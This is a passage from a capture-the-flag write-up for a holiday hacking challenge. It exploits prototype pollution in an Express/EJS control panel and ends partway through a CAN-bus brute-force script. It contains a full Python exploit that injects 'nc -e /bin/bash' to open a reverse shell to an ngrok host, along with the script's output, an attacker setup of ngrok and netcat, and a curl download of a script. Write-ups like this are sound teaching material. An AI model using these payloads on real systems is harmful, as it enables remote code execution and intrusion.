<p>From the endpoints I saw that there was just one endpoint taking any form of input, <em>/ctrlsignals</em>. I knew from the hints that I were facing prototype poisoning, and this endpoint seemed to fit the bill. So the hunt began.</p>
<p>At first I figured out that if I sent a single apostrophe (<em>&rsquo;</em>) I could make the system fail at the input parsing/decoding step:</p>
<div class="highlight wrap-code" dir="auto"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>SyntaxError: Unexpected token &#39; in JSON at position 0 Â  Â at JSON.parse (&lt;anonymous&gt;) Â  Â at /app/server.js:121:33 Â  Â at Layer.handle [as handle_request] (/app/node_modules/express/lib/router/layer.js:95:5) Â  Â at next (/app/node_modules/express/lib/router/route.js:149:13) Â  Â at Route.dispatch (/app/node_modules/express/lib/router/route.js:119:3) Â  Â at Layer.handle [as handle_request] (/app/node_modules/express/lib/router/layer.js:95:5) Â  Â at /app/node_modules/express/lib/router/index.js:284:15 Â  Â at Function.process_params (/app/node_modules/express/lib/router/index.js:346:12) Â  Â at next (/app/node_modules/express/lib/router/index.js:280:10) Â  Â at /app/server.js:49:9</span></span></code></pre></div>
<p>From this I learned that I was dealing with <em>express.js</em> and one common templating engine in use is <em>EJS</em>. I read up on various resources (included at end of writeup) on prototype posioning. Trying the payloads I found I provoked the following error message to confirm <em>__proto__</em> vulnerability:</p>
<div class="highlight wrap-code" dir="auto"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>https://hhc25-smartgnomehack-prod.holidayhackchallenge.com/ctrlsignals?message<span style="color:#f92672">={</span><span style="color:#e6db74">&#34;action&#34;</span>:<span style="color:#e6db74">&#34;update&#34;</span>,<span style="color:#e6db74">&#34;key&#34;</span>:<span style="color:#e6db74">&#34;__proto__&#34;</span>,<span style="color:#e6db74">&#34;subkey&#34;</span>:<span style="color:#e6db74">&#34;toString&#34;</span>,<span style="color:#e6db74">&#34;value&#34;</span>:<span style="color:#e6db74">&#34;a&#34;</span><span style="color:#f92672">}</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>URL encoded version:
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>https://hhc25-smartgnomehack-prod.holidayhackchallenge.com/ctrlsignals?message<span style="color:#f92672">=</span>%7B%22action%22:%22update%22,%22key%22:%22__proto__%22,%22subkey%22:%22toString%22,%22value%22:%22a%22%7D</span></span></code></pre></div>
<p>By refreshing the <strong>/stats</strong> page this error message manifested itself:</p>
<div class="highlight wrap-code" dir="auto"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>TypeError: Object.prototype.toString.call is not a function
</span></span><span style="display:flex;"><span>    at Object.isRegExp (/app/node_modules/qs/lib/utils.js:231:38)
</span></span><span style="display:flex;"><span>    at normalizeParseOptions (/app/node_modules/qs/lib/parse.js:289:64)
</span></span><span style="display:flex;"><span>    at module.exports [as parse] (/app/node_modules/qs/lib/parse.js:305:19)
</span></span><span style="display:flex;"><span>    at parseExtendedQueryString (/app/node_modules/express/lib/utils.js:289:13)
</span></span><span style="display:flex;"><span>    at query (/app/node_modules/express/lib/middleware/query.js:42:19)
</span></span><span style="display:flex;"><span>    at Layer.handle [as handle_request] (/app/node_modules/express/lib/router/layer.js:95:5)
</span></span><span style="display:flex;"><span>    at trim_prefix (/app/node_modules/express/lib/router/index.js:328:13)
</span></span><span style="display:flex;"><span>    at /app/node_modules/express/lib/router/index.js:286:9
</span></span><span style="display:flex;"><span>    at Function.process_params (/app/node_modules/express/lib/router/index.js:346:12)
</span></span><span style="display:flex;"><span>    at next (/app/node_modules/express/lib/router/index.js:280:10)</span></span></code></pre></div>
<p>To further narrowing things down I tried to uncover the rendering engine:</p>
<div class="highlight wrap-code" dir="auto"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>Payload
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>	&#34;action&#34;: &#34;update&#34;,
</span></span><span style="display:flex;"><span>	&#34;key&#34;:&#34;__proto__&#34;,
</span></span><span style="display:flex;"><span>	&#34;subkey&#34;: &#34;escapeFn&#34;,
</span></span><span style="display:flex;"><span>	&#34;value&#34;:&#34;{\&#34;view options\&#34;: {\&#34;client\&#34;: 1, \&#34;escapeFn\&#34;: \&#34;process.mainModule.require(&#39;child_process&#39;).exec(&#39;ls&#39;, (_, stdout, stderr) =&gt; console.log(stdout || stderr));\&#34;}}&#34;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Error triggered:
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>TypeError: /app/views/stats.ejs:70
</span></span><span style="display:flex;"><span>    68|                 &lt;% gnomeStats.forEach(stat =&gt; { %&gt;
</span></span><span style="display:flex;"><span>    69|                     &lt;tr&gt;
</span></span><span style="display:flex;"><span> &gt;&gt; 70|                         &lt;td class=&#34;key-cell&#34;&gt;&lt;%= stat.name %&gt;&lt;/td&gt;
</span></span><span style="display:flex;"><span>    71|                         &lt;td class=&#34;value-cell&#34;&gt;&lt;%= stat.value %&gt;&lt;/td&gt;
</span></span><span style="display:flex;"><span>    72|                     &lt;/tr&gt;
</span></span><span style="display:flex;"><span>    73|                 &lt;% }); %&gt;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>escapeFn is not a function
</span></span><span style="display:flex;"><span>    at eval (/app/views/stats.ejs:15:16)
</span></span><span style="display:flex;"><span>    at Array.forEach (&lt;anonymous&gt;)
</span></span><span style="display:flex;"><span>    at eval (/app/views/stats.ejs:12:19)
</span></span><span style="display:flex;"><span>    at stats (/app/node_modules/ejs/lib/ejs.js:691:17)
</span></span><span style="display:flex;"><span>    at tryHandleCache (/app/node_modules/ejs/lib/ejs.js:272:36)
</span></span><span style="display:flex;"><span>    at exports.renderFile [as engine] (/app/node_modules/ejs/lib/ejs.js:489:10)
</span></span><span style="display:flex;"><span>    at View.render (/app/node_modules/express/lib/view.js:135:8)
</span></span><span style="display:flex;"><span>    at tryRender (/app/node_modules/express/lib/application.js:657:10)
</span></span><span style="display:flex;"><span>    at Function.render (/app/node_modules/express/lib/application.js:609:3)
</span></span><span style="display:flex;"><span>    at ServerResponse.render (/app/node_modules/express/lib/response.js:1049:7)</span></span></code></pre></div>
<p>From the error message the template engine is indeed <em>EJS</em>!</p>
<h3 id="the-control-panel---exploiting">The control panel - exploiting</h3>
<p>Armed with the findings above and a whole slew of documentation, I decided to try to exploit the vulnerability. From the hints I knew I had to establish a reverse shell. Yet again, I turned to Python to ensure a reproducible methodology. This Python script turned out to be gold. I could easily tweak my payload, run the script and get the complete overview of output I needed. Gold, pure gold.</p>
<p>The general worklow of the script is:</p>
<ol>
<li>Login to the control panel</li>
<li>Trigger JSON parse error</li>
<li>Stages the payload. In this (final) version it pollutes __proto__ with a piece of code that connects back to my reverse shell</li>
<li>Triggers the reverse shell by visiting the <em>/stats endpoint</em></li>
</ol>
<div class="highlight wrap-code" dir="auto"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> requests
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> json
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> html
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> urllib.parse
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> bs4 <span style="color:#f92672">import</span> BeautifulSoup
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Login</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># </span>
</span></span><span style="display:flex;"><span>login_url <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;https://hhc25-smartgnomehack-prod.holidayhackchallenge.com/login?id=dfbd809f-8d6a-4500-87ba-c6e29b90f34c&#34;</span>
</span></span><span style="display:flex;"><span>creds <span style="color:#f92672">=</span> { <span style="color:#e6db74">&#34;username&#34;</span>: <span style="color:#e6db74">&#34;bruce&#34;</span>, <span style="color:#e6db74">&#34;password&#34;</span>: <span style="color:#e6db74">&#34;oatmeal12&#34;</span> }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>s <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>Session()
</span></span><span style="display:flex;"><span>r <span style="color:#f92672">=</span> s<span style="color:#f92672">.</span>post(login_url, data<span style="color:#f92672">=</span>creds)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Trigger JSON parse error</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>error_url <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;https://hhc25-smartgnomehack-prod.holidayhackchallenge.com/ctrlsignals?message=&#39;&#34;</span>
</span></span><span style="display:flex;"><span>payload_r <span style="color:#f92672">=</span> s<span style="color:#f92672">.</span>get(error_url)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;URL: </span><span style="color:#e6db74">{</span>payload_r<span style="color:#f92672">.</span>url<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>soup <span style="color:#f92672">=</span> BeautifulSoup(payload_r<span style="color:#f92672">.</span>text, <span style="color:#e6db74">&#34;html.parser&#34;</span>)
</span></span><span style="display:flex;"><span>raw_text <span style="color:#f92672">=</span> soup<span style="color:#f92672">.</span>pre<span style="color:#f92672">.</span>get_text() 
</span></span><span style="display:flex;"><span>decoded_text <span style="color:#f92672">=</span> html<span style="color:#f92672">.</span>unescape(raw_text)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">===========================================&#34;</span>)
</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#34;Step 1. Provoke Error message&#34;</span>)
</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#34;===========================================</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)
</span></span><span style="display:flex;"><span>print(decoded_text)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Staging</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#</span>
</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">===========================================&#34;</span>)
</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#34;Step 2. Staging&#34;</span>)
</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#34;===========================================&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> subkey <span style="color:#f92672">in</span> [<span style="color:#e6db74">&#34;debug&#34;</span>, <span style="color:#e6db74">&#34;client&#34;</span>]:
</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">== Staging </span><span style="color:#e6db74">{</span>subkey<span style="color:#e6db74">}</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">=</span> {
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;action&#34;</span>: <span style="color:#e6db74">&#34;update&#34;</span>,
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;key&#34;</span>: <span style="color:#e6db74">&#34;__proto__&#34;</span>,
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;subkey&#34;</span>: subkey,
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;value&#34;</span>: <span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    payload_encoded <span style="color:#f92672">=</span> urllib<span style="color:#f92672">.</span>parse<span style="color:#f92672">.</span>quote_plus(json<span style="color:#f92672">.</span>dumps(payload))
</span></span><span style="display:flex;"><span>    proto_url <span style="color:#f92672">=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;https://hhc25-smartgnomehack-prod.holidayhackchallenge.com/ctrlsignals?message=</span><span style="color:#e6db74">{</span>payload_encoded<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>    payload_r <span style="color:#f92672">=</span> s<span style="color:#f92672">.</span>get(proto_url)
</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;URL: </span><span style="color:#e6db74">{</span>payload_r<span style="color:#f92672">.</span>url<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
</span></span><span style="display:flex;"><span>    print(payload_r<span style="color:#f92672">.</span>text)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">===========================================&#34;</span>)
</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#34;Step 3. Weaponizing&#34;</span>)
</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#34;===========================================</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;action&#34;</span>: <span style="color:#e6db74">&#34;update&#34;</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;key&#34;</span>: <span style="color:#e6db74">&#34;__proto__&#34;</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;subkey&#34;</span>: <span style="color:#e6db74">&#34;escapeFunction&#34;</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;value&#34;</span>: <span style="color:#e6db74">&#34;JSON.stringify; process.mainModule.require(&#39;child_process&#39;).exec(&#39;nc -e /bin/bash 4.tcp.eu.ngrok.io 19342;sleep 10000000&#39;)&#34;</span>
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>payload_encoded <span style="color:#f92672">=</span> urllib<span style="color:#f92672">.</span>parse<span style="color:#f92672">.</span>quote_plus(json<span style="color:#f92672">.</span>dumps(payload))
</span></span><span style="display:flex;"><span>proto_url <span style="color:#f92672">=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;https://hhc25-smartgnomehack-prod.holidayhackchallenge.com/ctrlsignals?message=</span><span style="color:#e6db74">{</span>payload_encoded<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>payload_r <span style="color:#f92672">=</span> s<span style="color:#f92672">.</span>get(proto_url)
</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;URL: </span><span style="color:#e6db74">{</span>payload_r<span style="color:#f92672">.</span>url<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
</span></span><span style="display:flex;"><span>print(payload_r<span style="color:#f92672">.</span>text)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Smart Gnome Control Center - Smart Gnome Statistics panel</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># </span>
</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">===========================================&#34;</span>)
</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#34;Step 4. Stats page&#34;</span>)
</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#34;===========================================</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>stats_panel_url <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;https://hhc25-smartgnomehack-prod.holidayhackchallenge.com/stats&#34;</span>
</span></span><span style="display:flex;"><span>stats_r <span style="color:#f92672">=</span> s<span style="color:#f92672">.</span>get(stats_panel_url)
</span></span><span style="display:flex;"><span>print(stats_r<span style="color:#f92672">.</span>text)</span></span></code></pre></div>
<p>For each step I printed out the URL complete with the url encoded payload. This was done in order to reproduce the step in a browser to control the robot and thus completing the game. Below are the output from the script:</p>
<div class="highlight wrap-code" dir="auto"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>===========================================
</span></span><span style="display:flex;"><span>Step 1. Provoke Error message
</span></span><span style="display:flex;"><span>===========================================
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>SyntaxError: Unexpected token &#39; in JSON at position 0 Â  Â at JSON.parse (&lt;anonymous&gt;) Â  Â at /app/server.js:121:33 Â  Â at Layer.handle [as handle_request] (/app/node_modules/express/lib/router/layer.js:95:5) Â  Â at next (/app/node_modules/express/lib/router/route.js:149:13) Â  Â at Route.dispatch (/app/node_modules/express/lib/router/route.js:119:3) Â  Â at Layer.handle [as handle_request] (/app/node_modules/express/lib/router/layer.js:95:5) Â  Â at /app/node_modules/express/lib/router/index.js:284:15 Â  Â at Function.process_params (/app/node_modules/express/lib/router/index.js:346:12) Â  Â at next (/app/node_modules/express/lib/router/index.js:280:10) Â  Â at /app/server.js:49:9
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>===========================================
</span></span><span style="display:flex;"><span>Step 2. Staging
</span></span><span style="display:flex;"><span>===========================================
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>== Staging debug
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>URL: https://hhc25-smartgnomehack-prod.holidayhackchallenge.com/ctrlsignals?message=%7B%22action%22%3A+%22update%22%2C+%22key%22%3A+%22__proto__%22%2C+%22subkey%22%3A+%22debug%22%2C+%22value%22%3A+1%7D
</span></span><span style="display:flex;"><span>{&#34;type&#34;:&#34;message&#34;,&#34;data&#34;:&#34;success&#34;,&#34;message&#34;:&#34;Updated __proto__.debug to 1&#34;}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>== Staging client
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>URL: https://hhc25-smartgnomehack-prod.holidayhackchallenge.com/ctrlsignals?message=%7B%22action%22%3A+%22update%22%2C+%22key%22%3A+%22__proto__%22%2C+%22subkey%22%3A+%22client%22%2C+%22value%22%3A+1%7D
</span></span><span style="display:flex;"><span>{&#34;type&#34;:&#34;message&#34;,&#34;data&#34;:&#34;success&#34;,&#34;message&#34;:&#34;Updated __proto__.client to 1&#34;}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>===========================================
</span></span><span style="display:flex;"><span>Step 3. Weaponizing
</span></span><span style="display:flex;"><span>===========================================
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>URL: https://hhc25-smartgnomehack-prod.holidayhackchallenge.com/ctrlsignals?message=%7B%22action%22%3A+%22update%22%2C+%22key%22%3A+%22__proto__%22%2C+%22subkey%22%3A+%22escapeFunction%22%2C+%22value%22%3A+%22JSON.stringify%3B+process.mainModule.require%28%27child_process%27%29.exec%28%27nc+-e+%2Fbin%2Fbash+4.tcp.eu.ngrok.io+19342%3Bsleep+10000000%27%29%22%7D
</span></span><span style="display:flex;"><span>{&#34;type&#34;:&#34;message&#34;,&#34;data&#34;:&#34;success&#34;,&#34;message&#34;:&#34;Updated __proto__.escapeFunction to JSON.stringify; process.mainModule.require(&#39;child_process&#39;).exec(&#39;nc -e /bin/bash 4.tcp.eu.ngrok.io 19342;sleep 10000000&#39;)&#34;}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>===========================================
</span></span><span style="display:flex;"><span>Step 4. Stats page
</span></span><span style="display:flex;"><span>===========================================
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>... snip ...</span></span></code></pre></div>
<p>In the initial development phase of my payload I made the server reach out to a <a href="https://webhook.site/" rel="external">webhook.site</a> page on the Internet. This provided an excellent way to verify that the server could reach the Internet. Once that was done I simply changed over to using an Ngrok infrastucture with a <em>netcat</em> listener.</p>
<h3 id="setup-attack-infrastructure">Setup attack infrastructure</h3>
<p>As mentioned, my plan was to make the server connect back to me using a reverse shell. In order to do that I had to set up an infrastructure of</p>
<ol>
<li>Reverse shell listener</li>
<li>Web server to deliver scripts and utilities</li>
</ol>
<p>The infrastructure I landed up was based on <a href="https://ngrok.com/" rel="external">Ngrok</a> and Kali in WSL (in total four instances):</p>
<table>
  <thead>
      <tr>
          <th>Command</th>
          <th>Public</th>
          <th>Description</th>
      </tr>
  </thead>
  <tbody>
      <tr>
          <td>ngrok tcp 8501</td>
          <td>Yes</td>
          <td>Public exposed reverse shell port through Ngrok</td>
      </tr>
      <tr>
          <td>nc -lnvp 8501</td>
          <td>No</td>
          <td>Local (attacking machine) listening port using Netcat mapped to public Ngrok bridge</td>
      </tr>
      <tr>
          <td>ngrok http 8001</td>
          <td>Yes</td>
          <td>Public exposed web server for serving scripts</td>
      </tr>
      <tr>
          <td>python3 -m http.server 8001</td>
          <td>No</td>
          <td>Local (attacking machine) web server mapped to public Ngrok bridge</td>
      </tr>
  </tbody>
</table>
<p>The architecture ended up looking like this:</p>
<pre class="mermaid align-center ">---
config:
      theme: redux
---
flowchart LR
    subgraph Attacker[&#34;Attacking machine&#34;]
        webserver
        netcat
    end

    subgraph NGROK[&#34;NGROK&#34;]
        HTTP
        TCP
    end

    SGCC[&#34;Smart Gnome Control Center&#34;] &lt;--TCP/443--&gt; HTTP
    SGCC[&#34;Smart Gnome Control Center&#34;] &lt;--TCP/19342--&gt; TCP
    HTTP &lt;--TCP/8001--&gt; webserver[&#34;Python webserver&#34;]
    TCP &lt;--TCP/8501--&gt; netcat[&#34;Netcat listener&#34;]</pre>
<p>Regarding the HTTP server, this was merely used as a transport utility using <em>curl</em> for transferring my scripts back and forth and related commands to this will not be covered in this writeup.</p>
<h3 id="the-attack">The attack</h3>
<p>After having set up the architecture and issued the payloads, the server called back and got myself a shell. I immediately started to have a look around:</p>
<p><a href="#R-image-d1f0df3a947dfb15ad9f61d86be66ee3" class="lightbox-link"><img alt="Call back" class="lazy lightbox figure-image" loading="lazy" src="/images/act3/act3-hackagnome-2.png" style="height: auto;width: auto;"></a>
<a href="javascript:history.back();" class="lightbox-back" id="R-image-d1f0df3a947dfb15ad9f61d86be66ee3"><img alt="Call back" class="lazy lightbox lightbox-image" loading="lazy" src="/images/act3/act3-hackagnome-2.png"></a></p>
<p>A lot of junk, but the <em>canbus_client.py</em> seemed relevant:</p>
<p><a href="#R-image-014543406ef4c74e9d197e4fe9b4c3b1" class="lightbox-link"><img alt="Canbus client" class="lazy lightbox figure-image" loading="lazy" src="/images/act3/act3-hackagnome-3.png" style="height: auto;width: auto;"></a>
<a href="javascript:history.back();" class="lightbox-back" id="R-image-014543406ef4c74e9d197e4fe9b4c3b1"><img alt="Canbus client" class="lazy lightbox lightbox-image" loading="lazy" src="/images/act3/act3-hackagnome-3.png"></a></p>
<p>It truned out this was a script to interact with the CAN bus and contained a COMMAND_MAP with codes I recognized from the error messages for the bot in the Gnome Control Center. All of the mentioned codes were associated with errors, and the comment in code mentioned they were wrong. I then turned my attention to the <em>README.md</em> file:</p>
<p><a href="#R-image-3acc720d059638b11b58b6209f4080c6" class="lightbox-link"><img alt="README file" class="lazy lightbox figure-image" loading="lazy" src="/images/act3/act3-hackagnome-4.png" style="height: auto;width: auto;"></a>
<a href="javascript:history.back();" class="lightbox-back" id="R-image-3acc720d059638b11b58b6209f4080c6"><img alt="README file" class="lazy lightbox lightbox-image" loading="lazy" src="/images/act3/act3-hackagnome-4.png"></a></p>
<p>A whole lot of text, but only the very last part was actually of interest. It basically stated the codes to move the robot was unknown at the moment. So - I needed to figure out these codes on my own.</p>
<h3 id="enumerating-control-codes">Enumerating control codes</h3>
<p>In order to find the correct control codes, I took basis in the Python script on the server, uploaded it to and asked ChatGPT to make it into a bruteforcing script. This script was then uploaded back onto the server using the command:</p>
<div class="highlight wrap-code" dir="auto"><pre tabindex="0"><code>curl -o cb.py  https://scarabaeiform-prolixly-odin.ngrok-free.dev/cb.py</code></pre></div>
<p>I had to run this script in several iterations due to the amount of HEX codes involved. adjusting the HEX range for each run. For each iteration I kept an eye on the robot in <em>Gnome Control Interface</em> for any movement. After some runs I had narrowed the codes down to the <em>0x200-0x206</em> range. The script below is the final revision for that range:</p>
<div class="highlight wrap-code" dir="auto"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/env python3</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> time
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> struct
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> can
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>IFACE <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;gcan0&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>RPM_LEFT_ID  <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x310</span>
</span></span><span style="display:flex;"><span>RPM_RIGHT_ID <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x311</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># LIMIT THE SEARCH RANGE HERE (end is exclusive)</span>
</span></span><span style="display:flex;"><span>SCAN_START <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x200</span>
</span></span><span style="display:flex;"><span>SCAN_END   <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x206</span>   <span style="color:#75715e"># includes 0x205</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">int16_be</span>(b: bytes) <span style="color:#f92672">-&gt;</span> int:
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> struct<span style="color:#f92672">.</span>unpack(<span style="color:#e6db74">&#34;&gt;h&#34;</span>, b[:<span style="color:#ae81ff">2</span>])[<span style="color:#ae81ff">0</span>]
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">read_rpm_snapshot</span>(bus, window_s<span style="color:#f92672">=</span><span style="color:#ae81ff">0.20</span>):
</span></span><span style="display:flex;"><span>    end <span style="color:#f92672">=</span> time<span style="color:#f92672">.</span>time() <span style="color:#f92672">+</span> window_s
</span></span><span style="display:flex;"><span>    left <span style="color:#f92672">=</span> right <span style="color:#f92672">=</span> <span style="color:#66d9ef">None</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">while</span> time<span style="color:#f92672">.</span>time() <span style="color:#f92672">&lt;</span> end:
</span></span><span style="display:flex;"><span>        msg <span style="color:#f92672">=</span> bus<span style="color:#f92672">.</span>recv(timeout<span style="color:#f92672">=</span><span style="color:#ae81ff">0.02</span>)
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> msg:
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">continue</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> msg<span style="color:#f92672">.</span>arbitration_id <span style="color:#f92672">==</span> RPM_LEFT_ID <span style="color:#f92672">and</span> len(msg<span style="color:#f92672">.</span>data) <span style="color:#f92672">&gt;=</span> <span style="color:#ae81ff">2</span>:
</span></span><span style="display:flex;"><span>            left <span style="color:#f92672">=</span> int16_be(msg<span style="color:#f92672">.</span>data)
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">elif</span> msg<span style="color:#f92672">.</span>arbitration_id <span style="color:#f92672">==</span> RPM_RIGHT_ID <span style="color:#f92672">and</span> len(msg<span style="color:#f92672">.</span>data) <span style="color:#f92672">&gt;=</span> <span style="color:#ae81ff">2</span>:
</span></span><span style="display:flex;"><span>            right <span style="color:#f92672">=</span> int16_be(msg<span style="color:#f92672">.</span>data)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> left, right
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">rpm_changed</span>(before, after, threshold<span style="color:#f92672">=</span><span style="color:#ae81ff">30</span>):
